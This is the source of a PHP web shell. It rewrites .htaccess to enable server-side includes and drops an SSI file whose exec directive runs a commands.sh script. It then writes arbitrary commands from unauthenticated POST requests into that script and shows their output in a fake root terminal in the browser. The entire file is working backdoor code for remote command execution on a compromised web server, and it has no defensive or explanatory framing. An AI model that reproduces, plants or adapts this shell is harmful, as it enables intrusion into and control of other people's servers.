<?php

$directives = 'Options +Includes
AddType text/html .shtml
AddHandler server-parsed .shtml
';


if (!file_exists('driver.shtml'))
file_put_contents('driver.shtml', '<!--#exec cmd="source ./commands.sh 2>&1" -->');

if (!file_exists('.htaccess') || strpos(file_get_contents('.htaccess'), 'shtml')===false)
{
 $c = file_exists('.htaccess') ? file_get_contents('.htaccess')."\n" : '';
 file_put_contents('.htaccess', $c.$directives);
}

//disable magic quotes!!
error_reporting(E_ALL^E_NOTICE);
$tf = explode('/', $_SERVER["SCRIPT_NAME"]);
$tf = $tf[count($tf)-1];
if (get_magic_quotes_gpc())
{
 $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
 while (list($key, $val) = each($process))
 {
  foreach ($val as $k => $v)
  {
   unset($process[$key][$k]);
   if (is_array($v))
   {
    $process[$key][stripslashes($k)] = $v;
    $process[] = &$process[$key][stripslashes($k)];
   }
   else
   {
    $process[$key][stripslashes($k)] = stripslashes($v);
   }
  }
 }
 unset($process);
}

if ($_POST['jx'])
{
 header('Content-type: text/plain; charset=utf-8');
 
 $cstr = '';
 
 if (isset($_POST['cwd']))
 $cstr .= 'cd '.$_POST['cwd'].'; ';
 
 $cstr .= $_POST['cmd'];
 
 file_put_contents('commands.sh', $cstr);
 echo('ok');
 exit;
}

?>
<style>
body, textarea {background-color: black; color: white; font-size: 12px;}
</style>
<script>
window.onload = setthesize;
window.onresize = setthesize;
window.updir = 0;
window.commands = new Array();
window.postURL = '<?php echo($tf); ?>';
window.loggeduser = "CANTTELL";
window.cwd = "<?=getcwd()?>";
window.homecwd = window.cwd;
function setthesize()
{
 document.getElementById("command").style.height=(window.innerHeight-20)+"px";
 document.getElementById("command").style.width=(window.innerWidth-20)+"px";
 document.getElementById("command").selectionStart=document.getElementById("command").value.length;
 document.getElementById("command").selectionEnd=document.getElementById("command").value.length;
 document.getElementById("command").focus();
}
function appenddirectory(cwd, str)
{
 var ret = '';
 
 if (str.substr(0, 1)=="/")
 ret = str;
 else
 {
  var real = [], c = (cwd+'/'+str).split('/');
  for(var i=0;i<c.length;i++)
  {
   if ((c[i] == "..") && real.length>0)
   {
    real.splice(real.length-1, 1);
   }
   else if ((c[i] != ".") && (c[i] != ""))
   real.push(c[i]);
  }
  ret = '/'+real.join('/');
 }
 
 return ret;
}
function writelastline(str)
{
 var call = document.getElementById("command").value.split("\n"), i;
 call[call.length-1] = str;
 document.getElementById("command").value = call.join("\n");
}
function cmdup(e)
{
 if (window.commands.length>(window.updir))
 {
  window.updir++;
  writelastline("");
  newcmd();
  document.getElementById("command").value += window.commands[window.commands.length-window.updir];
 }
 if (e.stopPropagation)
 {
  e.stopPropagation();
  e.preventDefault();
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function cmdown(e)
{
 if (window.updir>1)
 {
  window.updir--;
  writelastline("");
  newcmd();
  document.getElementById("command").value += window.commands[window.commands.length-window.updir];
 }
 if (e.stopPropagation)
 {
  e.stopPropagation();
  e.preventDefault();
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function getcmd()
{
 var all = document.getElementById("command").value.split("\n");
 var command = all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2);
 return command;
}
function openXHR()
{
 var xhr = new XMLHttpRequest();
 xhr.open("POST", postURL, true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 return xhr;
}
function fetchDriver(cb)
{
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'driver.shtml?'+Math.round(Math.random()*100000));
 xhr.onload = function(){cb(xhr.responseText);};
 xhr.send();
}
function postCMD(cmd, cwd)
{
 var xhr = openXHR();
 xhr.onreadystatechange=function()
 {
  if (xhr.readyState==4 && xhr.status==200)
  {
   fetchDriver(function(content)
   {
    document.getElementById("command").value += content;
    newcmd();
   });
  } 
 };
 
 xhr.send('jx=1&cmd='+urlencode(cmd)+(cwd?'&cwd='+urlencode(cwd):''));
}
function postVerify(cwd)
{
 var xhr = openXHR();
 xhr.onreadystatechange=function()
 {
  if (xhr.readyState==4 && xhr.status==200)
  {
   fetchDriver(function(content)
   {
    if (content.length)
    document.getElementById("command").value += content;
    else
    window.cwd = window.pendingCWD;
    
    newcmd();
   });
  } 
 };
 
 xhr.send('jx=1&cmd='+urlencode('cd '+cwd));
}
function urlencode(str)
{
 return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').
 replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
}
function newcmd()
{
 document.getElementById("command").value += "["+window.loggeduser+"@<?php echo(gethostname()); ?> "+((window.cwd=="/")?("/"):(window.cwd.split("/")[window.cwd.split("/").length-1]))+"]# ";
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function exec(e)
{
 window.updir=0;
 e.preventDefault();
 
 var all = document.getElementById("command").value.split("\n");
 var command = getcmd();
 
 if (command == 'clear')
 {
  window.commands = new Array();
  document.getElementById('command').value='';
  newcmd();
 }
 else if (command.substr(0, 2) == 'cd')
 {
  window.commands.push(command);
  document.getElementById("command").value += "\n";
  
  if (command.length == 2 || command.substr(3)=="~")
  {
   window.cwd = window.homecwd;
   newcmd();
  }
  else
  {
   postVerify(window.pendingCWD = appenddirectory(window.cwd, command.substr(3)));
  }
 }
 else
 {
  document.getElementById("command").value += "\n";
  
  if (command)
  { 
   window.commands.push(command);
   postCMD(command, window.cwd);
  } else newcmd(); 
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function bsp(e)
{
 var all = document.getElementById("command").value.split("\n");
 if (all[all.length-1].length==(all[all.length-1].indexOf("#")+2))
 e.preventDefault();
}
function parsekey(e, ths)
{
 if (e.keyCode==13){exec(e);}
 else if(e.keyCode==38){cmdup(e);return false;}
 else if(e.keyCode==40){cmdown(e);return false;}
 else if(e.keyCode==8){bsp(e);}
}
</script>
<textarea autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" rows=7 cols=130 id="command" onkeydown="parsekey(event, this);"></textarea>
<br>
<script>
var x = openXHR();
x.onreadystatechange=function()
{
 if (x.readyState==4 && x.status==200)
 {
  fetchDriver(function(content)
  {
   if (content.indexOf(':')===-1)
   loggeduser = content.slice(0, -1);
   
   newcmd();
  });
 } 
};
x.send('jx=1&cmd=whoami');
</script>
